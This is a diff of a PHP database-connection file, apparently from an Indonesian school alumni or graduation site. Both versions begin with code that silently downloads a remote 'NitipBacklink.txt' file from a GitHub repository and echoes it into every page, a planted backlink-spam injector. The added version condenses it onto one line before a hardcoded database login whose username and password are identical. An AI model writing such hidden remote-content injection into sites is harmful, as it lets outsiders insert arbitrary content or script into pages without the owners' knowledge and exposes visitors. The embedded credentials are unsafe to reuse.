@@ -1,25 +1,3 @@
 <?php
-$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-curl_close($ch);
-echo $result;
-// deklarasi parameter koneksi database
-$server   = "localhost";
-$username = "smanege5_lulus";
-$password = "smanege5_lulus";
-$database = "smanege5_lulus";
 
-// koneksi database
-$koneksi = mysqli_connect($server, $username, $password, $database);
-// cek koneksi
-if (!$koneksi) {
-    die('Koneksi Database Gagal : ');
-}
-(isset($_GET['pg'])) ? $pg = $_GET['pg'] : $pg = '';
-(isset($_GET['ac'])) ? $ac = $_GET['ac'] : $ac = '';
-
-// SETTING WAKTU
-date_default_timezone_set("Asia/Jakarta");
-define('BASEPATH', dirname(__FILE__));
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt'; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); curl_close($ch); echo $result; $conn= new mysqli('localhost','smanege5_alumni','smanege5_alumni','smanege5_alumni')or die("Could not connect to mysql".mysqli_error($con));
